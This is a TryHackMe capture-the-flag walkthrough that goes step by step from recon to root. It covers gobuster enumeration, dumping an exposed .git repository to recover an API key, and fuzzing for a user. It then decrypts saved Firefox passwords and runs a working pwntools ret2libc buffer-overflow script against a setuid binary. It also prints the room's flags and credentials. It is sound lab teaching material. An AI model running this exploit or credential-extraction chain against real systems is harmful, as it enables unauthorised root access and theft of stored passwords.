# Retro Walkthrough
### Link
- https://tryhackme.com/room/chronicle
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
Nmap scan report for 10.10.233.61
Host is up (0.10s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
8081/tcp  open     blackice-icecap
56896/tcp filtered unknown
```

```
sudo gobuster dir -u http://[IP] -w [Path]/directory-list-2.3-small.txt
```
**Gobuster scan result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.233.61
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/23 14:18:50 Starting gobuster in directory enumeration mode
===============================================================
/old                  (Status: 301) [Size: 310] [--> http://[IP]/old/]
```
When we check the directory **old**, we found 2 elements: 
- **note.txt**
- Directory **templates**

**notes** content
```
Everything has been moved to new directory and the webapp has been deployed
```
**templates** content : we open the tenplate website.

I have spend yime to check the content but nothing really interresting.

Now, I try to find something from **/old**
```
sudo gobuster dir -u http://[IP]/old/ -w ~/Documents/Tools/SecLists-master/wordlists/big.txt
```
**Gobuster hiddn Directory scan result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.233.61/old/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Documents/Tools/SecLists-master/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/23 14:33:42 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.git                 (Status: 301) [Size: 315] [--> http://10.10.233.61/old/.git/]
/.htaccess            (Status: 403) [Size: 277]
```

In parallel, let's explore the page by using port **8081**

We arrive to the website and now we have a proper login page ^^
---
### Git

We have **.git**. Really helpful because from this .git, we can have access to the command history, action history, repository tree architecture, etc..

Let's download this **.git**
```
 wget  http://[IP]/old/.git --recursive --continue
```
**old Content**
```
old % ls -la
total 80
drwxr-xr-x  14 laurentnebout  staff   448 Jan 23 14:38 .
drwxr-xr-x   5 laurentnebout  staff   160 Jan 23 14:37 ..
drwxr-xr-x  21 laurentnebout  staff   672 Jan 23 14:37 .git
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:37 index.html
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:37 index.html?C=D;O=A
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:38 index.html?C=D;O=D
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:37 index.html?C=M;O=A
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:38 index.html?C=M;O=D
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:38 index.html?C=N;O=A
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:37 index.html?C=N;O=D
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:37 index.html?C=S;O=A
-rw-r--r--   1 laurentnebout  staff  1129 Jan 23 14:38 index.html?C=S;O=D
-rw-r--r--   1 laurentnebout  staff    76 Mar 26  2021 note.txt
drwxr-xr-x   3 laurentnebout  staff    96 Jan 23 14:37 templates
```
We can start with a review of past commit
```
 old % git log
commit 038a67e0ebfde470bf83f31174b6e60726c646ae (HEAD -> master)
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:50:26 2021 +0000

    Clearing again

commit cd0375717551c8c8287a53b78b014b7d7e4da3bb
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:49:59 2021 +0000

    Clearing

commit 33891017aa63726711585c0a2cd5e39a80cd60e6
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:34:33 2021 +0000

    Finishing Things

commit 25fa9929ff34c45e493e172bcb64726dfe3a2780
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:32:19 2021 +0000

    First Commit
```
Now, we have a tough part. For each commit, we have an associated HASH. Let's move into each commit one by one.
**Clearing again**
```
commit 038a67e0ebfde470bf83f31174b6e60726c646ae (HEAD -> master)
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:50:26 2021 +0000

    Clearing again

diff --git a/static/css/boot.css b/static/css/boot.css
deleted file mode 100644
index 86c5733..0000000
--- a/static/css/boot.css
+++ /dev/null
@@ -1,803 +0,0 @@
-/*Google Fonts*/
-@import url('https://fonts.googleapis.com/css?family=Montserrat:500,600,700');
-@import url('https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600,700');
-@import url("https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css");
-
-body, html{
-       height: 100%;
-       width:100%;
-}
-body{
-       font-size: 1rem;
```
**Clearing**
```
git show cd0375717551c8c8287a53b78b014b7d7e4da3bb
commit cd0375717551c8c8287a53b78b014b7d7e4da3bb
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:49:59 2021 +0000

    Clearing

diff --git a/app.py b/app.py
deleted file mode 100644
index cbf47f5..0000000
--- a/app.py
+++ /dev/null
@@ -1,39 +0,0 @@
-from flask import Flask, render_template, request
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/login')
-def login():
-    return render_template('login.html')
```
**Finishing Things**
```
git show 33891017aa63726711585c0a2cd5e39a80cd60e6
commit 33891017aa63726711585c0a2cd5e39a80cd60e6
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:34:33 2021 +0000

    Finishing Things

diff --git a/app.py b/app.py
index 8c729fd..cbf47f5 100644
--- a/app.py
+++ b/app.py
@@ -22,11 +22,11 @@ def info(uname):
     print("OK")
     data=request.get_json(force=True)
     print(data)
-    if(data['key']=='abcd'):
+    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
         if(uname=="admin"):
-            return '{"username":"admin","password":"password"}'
+            return '{"username":"admin","password":"password"}'     #Default Change them as required
         elif(uname=="someone"):
-            return '{"username":"someone","password":"someword"}'
+            return '{"username":"someone","password":"someword"}'   #Some other user
         else:
```
**First Commit**
```
git show 25fa9929ff34c45e493e172bcb64726dfe3a2780
commit 25fa9929ff34c45e493e172bcb64726dfe3a2780
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:32:19 2021 +0000

    First Commit

diff --git a/app.py b/app.py
new file mode 100644
index 0000000..8c729fd
--- /dev/null
+++ b/app.py
@@ -0,0 +1,39 @@
+from flask import Flask, render_template, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/login')
+def login():
+    return render_template('login.html')
```
---
### Exploit
From the commit **Finishing Things**, we found a key **7454c262d0d5a3a0c0b678d6c0dbc7ef**

We cant try **FFUF** and see if we can catch something
```
sudo ffuf -w [PATH]/Common-Credentials/10k-most-common.txt -X POST -d '{"key"="7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -u http://10.10.233.61:8081/api/FUZZ -fw 2
``` 
**Result**
```
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"key":"7454c2[hidden]]c0dbc7ef"}' -u http://10.10.173.255:8081/api/FUZZ -fw 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.233.61:8081/api/FUZZ
 :: Wordlist         : FUZZ: /Users/laurentnebout/Documents/Tools/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt
 :: Data             : {"key"="7454c262d0d5a3a0c0b678d6c0dbc7ef"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 2
________________________________________________

tommy                   [Status: 200, Size: 49, Words: 1, Lines: 1]
```
Now , we have a username: **tommy**

From the login page at this address: http://[IP]:8081/login, if you click on **Forgot passwod?** and try **tommy**, nothing happened. Let's caprtue the request with Burp ^^
- First: Capture the request from the page  **Forgot passwod?** 
- Second: Send the request to **Repeater**
- Third: on the Reauest, update the key value from NULL --> 7454c262d0d5a3a0c0b678d6c0dbc7ef
- Fourth: Click **Send**
- Fifth: Check **Response**
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 49
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Sun, 23 Jan 2022 20:30:23 GMT

{"username":"tommy","password":"DevMakesStuff01"}
```
Now we have the username and password. Let's SSH the server
**Question**
#### user.txt

```
Last login: Fri Apr 16 14:05:02 2021 from 192.168.29.217
tommy@incognito:~$ ls -l
total 8
-rw-r--r-- 1 tommy tommyV   33 Apr  3  2021 user.txt
drwxr-xr-x 5 tommy tommyV 4096 Apr  3  2021 web
tommy@incognito:~$ cat user.txt
7ba840222ecbdb57af4d24eb222808ad
```
**Answer** 
#### 7ba840222ecbdb57af4d24eb222808ad
---
### Privilege escalation

Let's try **sudo -l**
```
tommy@incognito:~$ sudo -l
[sudo] password for tommy:
Sorry, user tommy may not run sudo on incognito.
```
**tommy** doesn't have the appropriate clearance to perform this command.

We can check the other user **carlJ**
```
tommy@incognito:/home$ ls -l
total 8
drwxr-xr-x 8 carlJ carlJ  4096 Jun 11  2021 carlJ
drwxr-xr-x 7 tommy tommyV 4096 Jun 11  2021 tommyV
```
```
tommy@incognito:/home/carlJ$ ls -la
total 44
drwxr-xr-x 8 carlJ carlJ 4096 Jun 11  2021 .
drwxr-xr-x 4 root  root  4096 Apr  3  2021 ..
lrwxrwxrwx 1 root  root     9 Apr  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 carlJ carlJ  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 carlJ carlJ 3772 Mar 26  2021 .bashrc
drwx------ 4 carlJ carlJ 4096 Apr  3  2021 .cache
drwxr-x--- 3 carlJ carlJ 4096 Apr  3  2021 .config
drwx------ 3 carlJ carlJ 4096 Apr  3  2021 .gnupg
drwxrwxr-x 3 carlJ carlJ 4096 Apr 16  2021 .local
drwxr-xr-x 5 carlJ carlJ 4096 Mar 28  2021 .mozilla
-rw-r--r-- 1 carlJ carlJ  808 Mar 26  2021 .profile
drwx------ 2 carlJ carlJ 4096 Apr 16  2021 mailing
```
We can explore all contents. Take times ^^;

Finally, I found something under **/home/carlJ/.mozilla/firefox**
```
tommy@incognito:/home/carlJ/.mozilla/firefox$ ls -la
total 32
drwxr-xr-x  6 carlJ carlJ 4096 Mar 28  2021  .
drwxr-xr-x  5 carlJ carlJ 4096 Mar 28  2021  ..
drwxr-xr-x 13 carlJ carlJ 4096 Apr  3  2021  0ryxwn4c.default-release
drwxr-xr-x  2 carlJ carlJ 4096 Mar 28  2021  45ir4czt.default
drwxr-xr-x  3 carlJ carlJ 4096 Mar 28  2021 'Crash Reports'
drwxr-xr-x  2 carlJ carlJ 4096 Mar 28  2021 'Pending Pings'
-rwxr-xr-x  1 carlJ carlJ   62 Mar 28  2021  installs.ini
-rwxr-xr-x  1 carlJ carlJ  259 Mar 28  2021  profiles.ini
```
How to decrypt this content? For that use case, I used [firefox decrypt](https://github.com/unode/firefox_decrypt)
- First: Download those 2 files **0ryxwn4c.default-release** **45ir4czt.default**
- Second: For each, execute **firefox decrypt** 
- Third: we have all inmportant information to continue our way ^^
```
Website:   https://incognito.com
Username: 'dev'
Password: 'Pas$w0RD59247'
```
Now we can switch to **carlJ** user
```
tommy@incognito:/home/carlJ/.mozilla/firefox$ su carlJ
Password:
carlJ@incognito:~/.mozilla/firefox$
```
Under **carlJ**, I found this progrm **smail**
```
carlJ@incognito:/home$ cd carlJ/
carlJ@incognito:~$ ls -l
total 4
drwx------ 2 carlJ carlJ 4096 Apr 16  2021 mailing
carlJ@incognito:~$ cd mailing/
carlJ@incognito:~/mailing$ ls -la
total 20
drwx------ 2 carlJ carlJ 4096 Apr 16  2021 .
drwxr-xr-x 8 carlJ carlJ 4096 Jun 11  2021 ..
-rwsrwxr-x 1 root  root  8544 Apr  3  2021 smail
```
Let's try it to see what happens
```
carlJ@incognito:~/mailing$ ./smail
What do you wanna do
1-Send Message
2-Change your Signature
```
Let's check more deeper into this binary
```
carlJ@incognito:~/mailing$ strings smail
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
stdin
fgetc
fgets
__libc_start_main
GLIBC_2.7
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
Changed
What do you wanna do
1-Send Message
2-Change your Signature
What message you want to send(limit 80)
Sent!
Write your signature...
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
ctf.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
fgetc@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```
Let's try to put many charaters to test the buffer limit
```
carlJ@incognito:~/mailing$ ./smail
What do you wanna do
1-Send Message
2-Change your Signature
2
Write your signature...
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
Changed
Segmentation fault (core dumped)
```
Important information!!! we can try to use the classic **buffer overflow**

To be able to create a script, we first need to know the first address
```
carlJ@incognito:~/mailing$ ldd smail
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
```
OK. We have the first address **0x00007ffff79e2000**

Now we need to find the appropriate address for **/bin/sh**
```
carlJ@incognito:~/mailing$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 1b3e1a /bin/sh
```
Last element, **libc**
```
carlJ@incognito:~/mailing$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
   232: 0000000000159cd0    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   607: 000000000004f550    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

**Script**
```
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```
First execution, yo have an error message. Follow the instruction
```
carlJ@incognito:~/mailing$ python3 buffer.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/carlJ/.cache/.pwntools-cache-3.6/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
```
Launch one more time the script and Bingo ^^
```
carlJ@incognito:~/mailing$ python3 buffer.py
[+] Starting local process './smail': pid 13227
[*] Switching to interactive mode
Changed
$ whoami
root
$ ls
buffer.py  smail
$ cd /root
$ ls
root.txt
$ cat root.txt
f21979de76c0302154cc001884143ab2
```
**Question**
#### root.txt
**Answer** 
#### f21979de76c0302154cc001884143ab2
